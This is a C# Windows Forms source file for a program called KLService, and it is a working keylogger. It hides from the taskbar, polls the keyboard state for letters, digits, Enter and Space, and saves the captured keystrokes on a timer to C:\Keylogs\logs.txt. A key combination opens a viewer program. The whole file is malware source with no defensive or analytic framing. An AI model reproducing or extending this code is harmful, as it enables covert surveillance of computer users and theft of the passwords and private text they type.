using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace KLService
{
    public partial class KLService : Form
    {
        public List<string> log;
        public Keys[] regkeys = {Keys.A,Keys.B, Keys.C, Keys.D, Keys.E, Keys.F,Keys.G, Keys.H, Keys.I, Keys.J, Keys.K, Keys.L, Keys.M, Keys.N, Keys.O, Keys.P, Keys.Q, Keys.R, Keys.S, Keys.T, Keys.U, Keys.V, Keys.W, Keys.X, Keys.Y, Keys.Z, Keys.D0, Keys.D1, Keys.D2, Keys.D3, Keys.D4, Keys.D5, Keys.D6, Keys.D7,Keys.D8,Keys.D9,Keys.Enter,Keys.Space};
        public string[] keymsg = { "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u" , "v", "w", "x", "y", "z", "0","1", "2" , "3" , "4" , "5" , "6" , "7" , "8" , "9","ENTER"," "};
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);
        public KLService()
        {
            InitializeComponent();
            log = new List<string>();
            this.ShowInTaskbar = false;
            if (!Directory.Exists("C:\\Keylogs"))
            {
                Directory.CreateDirectory("C:\\Keylogs");
            }
            if(!File.Exists("C:\\Keylogs\\logs.txt"))
            {
                File.WriteAllText("C:\\Keylogs\\logs.txt", "<newsave>"+DateTime.Now.ToString());
            }
            log = File.ReadAllLines("C:\\Keylogs\\logs.txt").ToList();
            log.Add("<NEWSAVE>");
            log.Add(DateTime.Now.ToString());
        }
        public void GetKeyDown()
        {
            string tolog = "";
            if(GetAsyncKeyState(Keys.Enter) == -32767&&GetAsyncKeyState(Keys.O)== -32767)
            {
                Process.Start("C:\\Keylogs\\KLGUI");
            }
            for(int i = 0; i < regkeys.Length; i++)
            {
                if (GetAsyncKeyState(regkeys[i])== -32767)
                {
                    tolog += keymsg[i];
                }
            }
            if (tolog != "")
            { 
                log.Add(tolog);
            }
        }

        private void logtimer_Tick(object sender, EventArgs e)
        {
            GetKeyDown();
        }

        private void savedata_Tick(object sender, EventArgs e)
        {
            File.WriteAllLines("C:\\Keylogs\\logs.txt", log.ToArray());
        }
    }
}
